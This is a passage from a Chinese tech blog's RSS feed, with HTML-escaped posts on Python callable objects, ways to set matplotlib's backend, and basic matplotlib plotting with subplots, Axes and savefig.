        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{name}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; is running&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;name))

stu &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Stu(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;小明&amp;#39;&lt;/span&gt;)
print(callable(stu))    &lt;span style=&#34;color:#75715e&#34;&gt;# True&lt;/span&gt;
stu()                   &lt;span style=&#34;color:#75715e&#34;&gt;# 小明 is running&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python—matplotlib 的 backend</title>
        <link>https://ac-lm.github.io/posts/python/pythonmatplotlib-%E7%9A%84-backend/</link>
        <pubDate>Wed, 24 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonmatplotlib-%E7%9A%84-backend/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://cloud.tencent.com/developer/article/1559466&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; matplotlib的backend浅析 @王云峰 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1matplotlib-的-backend-浅析&#34;&gt;1.matplotlib 的 backend 浅析&lt;/h2&gt;
&lt;p&gt;在服务器使用&lt;code&gt;matplotlib&lt;/code&gt;的时候，可能是因为没有装图形化和显示相关的包的原因，总是会出现&lt;code&gt;backend&lt;/code&gt;相关的错误。&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;matplotlib&lt;/code&gt; 中，&lt;code&gt;frontend&lt;/code&gt; 就是我们写的代码，而 &lt;code&gt;backend&lt;/code&gt; 就是负责显示我们代码所写图形的底层代码。因为不同使用环境下硬件情况不同，所以后端是跟具体的硬件和显示条件相关的。&lt;/p&gt;
&lt;h2 id=&#34;2backend-的类别&#34;&gt;2.backend 的类别&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;backend&lt;/code&gt; 又分为两类，一类是 &lt;code&gt;interface backend&lt;/code&gt;，又叫做 &lt;code&gt;interactive backend&lt;/code&gt;，这一类是表示跟显示到屏幕相关的后端；另一类是 &lt;code&gt;hardcopy backend&lt;/code&gt;，又叫做 &lt;code&gt;non-interactive backend&lt;/code&gt;，这一类是写入到文件相关的后端。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;non-interactive backend&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051046100.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051046100.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;interactive backend&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051047427.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051047427.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; matplotlib
matplotlib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rcsetup&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive_bk &lt;span style=&#34;color:#75715e&#34;&gt;# 获取 interactive backend&lt;/span&gt;
matplotlib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rcsetup&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;non_interactive_bk &lt;span style=&#34;color:#75715e&#34;&gt;# 获取 non-interactive backend&lt;/span&gt;
matplotlib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rcsetup&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;all_backends &lt;span style=&#34;color:#75715e&#34;&gt;# 获取 所有 backend&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3设置-backend&#34;&gt;3.设置 backend&lt;/h2&gt;
&lt;p&gt;在代码中，有 4 种方式可以来设置 matplotlib 的 backend，而且下列中越后面的设置方式，优先级越高，后面的设置会覆盖前面的设置。&lt;/p&gt;
&lt;h3 id=&#34;a通过设置-matplotlibrc-的配置文件来设置&#34;&gt;a.通过设置 &lt;code&gt;matplotlibrc&lt;/code&gt; 的配置文件来设置&lt;/h3&gt;
&lt;p&gt;注意 &lt;code&gt;matplotlibrc&lt;/code&gt; 文件不一定在你的工程目录下，可以通过如下命令来获取其存放位置:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; matplotlib
matplotlib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_configdir()
&lt;span style=&#34;color:#e6db74&#34;&gt;u&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/yunfeng/.config/matplotlib&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到配置文件路径后，打开这个文件，写入如下一行来设置 backend:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;backend : WXAgg   &lt;span style=&#34;color:#75715e&#34;&gt;# use wxpython with antigrain (agg) rendering&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中的 &lt;code&gt;WXAgg&lt;/code&gt; 可以换成任意的你的系统支持的 backend 类型。 &lt;strong&gt;注意：backend 不区分大小写&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;b通过-mplbackend-环境变量来设置-backend&#34;&gt;b.通过 &lt;code&gt;MPLBACKEND&lt;/code&gt; 环境变量来设置 backend&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 方式1. 先 export MPLBACKEND 再执行 python 文件&lt;/span&gt;
$ export MPLBACKEN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Agg&amp;#39;&lt;/span&gt;
$ python works.py

&lt;span style=&#34;color:#75715e&#34;&gt;# 方式2. 在 python 命令前加 MPLBACKEND=&amp;#39;XXX&amp;#39;&lt;/span&gt;
$ MPLBACKEND&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Agg&amp;#39;&lt;/span&gt; python works.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;c通过--d-选项来设置&#34;&gt;c.通过 &lt;code&gt;-d&lt;/code&gt; 选项来设置&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ python script.py -d backend
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因为这种方式很容易和脚本内部的参数解析冲突，所以不建议使用这种方式。&lt;/p&gt;
&lt;h3 id=&#34;d通过-matplotlibuse-函数来设置&#34;&gt;d.通过 &lt;code&gt;matplotlib.use()&lt;/code&gt; 函数来设置&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; matplotlib &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; mpl
mpl&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;use(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Agg&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python—matplotlib 绘图</title>
        <link>https://ac-lm.github.io/posts/python/pythonmatplotlib-%E7%BB%98%E5%9B%BE/</link>
        <pubDate>Tue, 23 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonmatplotlib-%E7%BB%98%E5%9B%BE/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/dudududu/p/9149762.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Python绘图与可视化 @小杜同学的嘚啵嘚 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1使用-matplotlib-进行绘图&#34;&gt;1.使用 Matplotlib 进行绘图&lt;/h2&gt;
&lt;p&gt;所谓“一图胜千言”，我们很多时候需要通过可视化的方式查看、分析数据，我们可以导入 Matplotlib 包，并通过 Pyplot 对 Matplotlib 进行操作来绘图&lt;/p&gt;
&lt;p&gt;安装：pip install matplotlib&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import matplotlib.pyplot as plt  # 约定俗成的写法 plt
# 首先定义两个函数（正弦&amp;amp;余弦）
import numpy as np

X=np.linspace(-np.pi,np.pi,256,endpoint=True)  # -π，to+π 的 256 个值
C,S=np.cos(X),np.sin(X)
plt.plot(X,C)
plt.plot(X,S)
plt.show()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051045261.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051045261.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;2绘图命令的基本架构及其属性设置&#34;&gt;2.绘图命令的基本架构及其属性设置&lt;/h2&gt;
&lt;p&gt;上面的例子我们可以看出，几乎所有的属性和绘图的框架我们都选用默认设置。其作图时先要定义一个画布，此处的画布就是 Figure，然后再把其他素材“画”到该 Figure 上。&lt;/p&gt;
&lt;h3 id=&#34;a在-figure-上创建子-plot并设置属性&#34;&gt;a.在 Figure 上创建子 plot，并设置属性&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;linspace(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# X轴数据&lt;/span&gt;
y1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sin(x)     &lt;span style=&#34;color:#75715e&#34;&gt;# Y轴数据&lt;/span&gt;
y2&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cos(x&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# Y轴数据 x^2即x的平方&lt;/span&gt;

plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;figure(figsize&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;))

plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(x,y1,label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;$sin(x)$&amp;#34;&lt;/span&gt;,color&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;red&amp;#34;&lt;/span&gt;,linewidth&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# 将$包围的内容渲染为数学公式&lt;/span&gt;
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(x,y2,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b--&amp;#34;&lt;/span&gt;,label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;$cos(x^2)$&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 指定曲线的颜色和线性，如&amp;#39;b--&amp;#39;表示蓝色虚线（b：蓝色，-：虚线）&lt;/span&gt;

plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;xlabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Time(s)&amp;#34;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ylabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Volt&amp;#34;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;title(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PyPlot First Example&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;使用关键字参数可以指定所绘制的曲线的各种属性：
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;label：给曲线指定一个标签名称，此标签将在图标中显示。如果标签字符串的前后都有字符&amp;#39;$&amp;#39;，则Matplotlib会使用其内嵌的LaTex引擎将其显示为数学公式
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;color：指定曲线的颜色。颜色可以用如下方法表示
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       英文单词
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       以 # 字符开头的3个16进制数，如 #ff0000 表示红色。
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       以0~1的RGB表示，如(1.0,0.0,0.0)也表示红色。
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;linewidth：指定权限的宽度，可以不是整数，也可以使用缩写形式的参数名lw。
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ylim(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.5&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1.5&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;legend() &lt;span style=&#34;color:#75715e&#34;&gt;# 显示左下角的图例&lt;/span&gt;
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;b在-figure-上创建多个子-plot&#34;&gt;b.在 Figure 上创建多个子 plot&lt;/h3&gt;
&lt;p&gt;如果需要绘制多幅图表的话，可以给 Figure 传递一个整数参数指定图表的序号，如果所指定序号的绘图对象已经存在的话，将不创建新的对象，而只是让它成为当前绘图对象。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;fig1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;figure(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;subplot(&lt;span style=&#34;color:#ae81ff&#34;&gt;211&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# subplot(211)把绘图区域等分为2行*1列共两个区域，然后在区域1（上区域）中创建一个轴对象&lt;/span&gt;
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;subplot(&lt;span style=&#34;color:#ae81ff&#34;&gt;212&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 在区域2（下区域）创建一个轴对象&lt;/span&gt;
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051045627.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051045627.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;我们还可以通过命令再次拆分这些块（相当于 Word 中拆分单元格操作）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;f1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;figure(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)&lt;span style=&#34;color:#75715e&#34;&gt;# 弹出对话框时的标题，如果显示的形式为弹出对话框的话&lt;/span&gt;
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;subplot(&lt;span style=&#34;color:#ae81ff&#34;&gt;221&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;subplot(&lt;span style=&#34;color:#ae81ff&#34;&gt;222&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;subplot(&lt;span style=&#34;color:#ae81ff&#34;&gt;212&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;subplots_adjust(left&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.08&lt;/span&gt;,right&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.95&lt;/span&gt;,wspace&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.25&lt;/span&gt;,hspace&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.45&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# subplots_adjust的操作时类似于网页css格式化中的边距处理，左边距离多少？&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 右边距离多少？这取决于你需要绘制的大小和各个模块之间的间距&lt;/span&gt;
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051045413.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051045413.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;c通过-axes-设置当前对象-plot-的属性&#34;&gt;c.通过 Axes 设置当前对象 plot 的属性&lt;/h3&gt;
&lt;p&gt;以上我们操作的是在 Figure 上绘制图案，但是当我们绘制图案过多，又需要选取不同的小模块进行格式化设置时，Axes 对象就能很好地解决这个问题。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;fig,axes&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;subplots(nrows&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,ncols&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051046698.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051046698.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;现在我们需要通过命令来操作每个 plot（subplot），设置它们的 title 并删除横纵坐标值。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;fig,axes&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;subplots(nrows&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,ncols&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
axes[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;set(title&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Upper Left&amp;#39;&lt;/span&gt;)
axes[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;set(title&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Upper Right&amp;#39;&lt;/span&gt;)
axes[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;set(title&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Lower Left&amp;#39;&lt;/span&gt;)
axes[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;set(title&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Lower Right&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# 通过Axes的flat属性进行遍历&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ax &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; axes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;flat:
    ax&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;set(xticks&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[],yticks&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[])
    &lt;span style=&#34;color:#75715e&#34;&gt;# xticks和yticks设置为空置&lt;/span&gt;
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051046875.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051046875.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;另外，实际来说，plot 操作的底层操作就是 Axes 对象的操作，只不过如果我们不使用 Axes 而用 plot 操作时，它默认的是 plot.subplot(111)，也就是说 plot 其实是 Axes 的特例。&lt;/p&gt;
&lt;h3 id=&#34;d保存-figure-对象&#34;&gt;d.保存 Figure 对象&lt;/h3&gt;
&lt;p&gt;最后一项操作就是保存，我们绘图的目的是用在其他研究中，或者希望可以把研究结果保存下来，此时需要的操作时 save。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;savefig(&lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\Users\123\Desktop\save_test.png&amp;#34;&lt;/span&gt;,dpi&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;520&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 默认像素dpi是80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;很明显保存的像素越高，内存越大。此处只是用了 savefig 属性对 Figure 进行保存。&lt;/p&gt;
&lt;p&gt;另外，除了上述的基本操作之外，Matplotlib 还有其他的绘图优势，此处只是简单介绍了它在绘图时所需要注意的事项，更多的属性设置请参考：&lt;a class=&#34;link&#34; href=&#34;https://matplotlib.org/api/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://matplotlib.org/api/&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>随记—什么是 Socket.IO</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-socket.io/</link>
        <pubDate>Tue, 23 Nov 2021 00:00:00 +0000</pubDate>
        
